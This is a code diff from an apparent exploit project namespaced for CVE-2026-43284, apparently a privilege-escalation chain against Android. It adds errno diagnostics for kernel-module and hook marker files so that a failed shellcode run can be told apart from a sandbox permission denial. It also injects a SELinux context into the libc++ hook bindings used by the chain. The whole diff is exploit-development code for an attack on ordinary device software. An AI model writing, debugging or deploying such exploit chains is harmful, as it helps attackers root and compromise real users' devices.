@@ -141,11 +141,26 @@ namespace ghostlock::backend::cve_2026_43284 {
             if (device.file_fact == nullptr || path == nullptr) {
                 return false;
             }
-            platform::FileFact fact{};
+                        platform::FileFact fact{};
             if (!device.file_fact(device.ctx, path, fact)) {
                 return false;
             }
             return fact.exists;
+        }
+
+        /* Bring-up diagnostics for the wait timeout: the raw access() errno of
+         * one marker path, so a log paste distinguishes "shellcode never fired"
+         * (ENOENT) from "marker exists but untrusted_app cannot stat it"
+         * (EACCES) without a shell on the device. */
+        [[nodiscard]] int marker_access_errno(const char *path) noexcept {
+            if (path == nullptr) {
+                return -1;
+            }
+            errno = 0;
+            if (::access(path, F_OK) == 0) {
+                return 0;
+            }
+            return errno;
         }
     } // namespace
 
@@ -290,6 +305,10 @@ namespace ghostlock::backend::cve_2026_43284 {
             libcxx.carrier_path = ctx->target_path != nullptr
                                           ? std::string_view(ctx->target_path)
                                           : std::string_view{};
+            if (ctx->hook_selinux_context != nullptr) {
+                libcxx.selinux_context =
+                        std::string_view(ctx->hook_selinux_context);
+            }
             steps::ShellcodeError binding_error = steps::ShellcodeError::None;
             if (!steps::make_libcxx_hook_bindings(libcxx, default_bindings,
                                                   default_binding_count,
@@ -462,6 +481,13 @@ namespace ghostlock::backend::cve_2026_43284 {
             const auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
                     std::chrono::steady_clock::now() - start);
             if (elapsed.count() >= static_cast<std::chrono::milliseconds::rep>(timeout_ms)) {
+                (void)std::fprintf(
+                        stderr,
+                        "run.43284 wait diag df=%d dfm0=%d dfm1=%d module=%d (0=present 13=present-denied 2=absent)\n",
+                        marker_access_errno(kLkmHookMarker),
+                        marker_access_errno(kLkmSuccessMarker),
+                        marker_access_errno(kLkmFailureMarker),
+                        marker_access_errno(kLkmModulePath));
                 return steps::ChainWaitOutcome::Timeout;
             }
             std::this_thread::sleep_for(std::chrono::milliseconds(10));
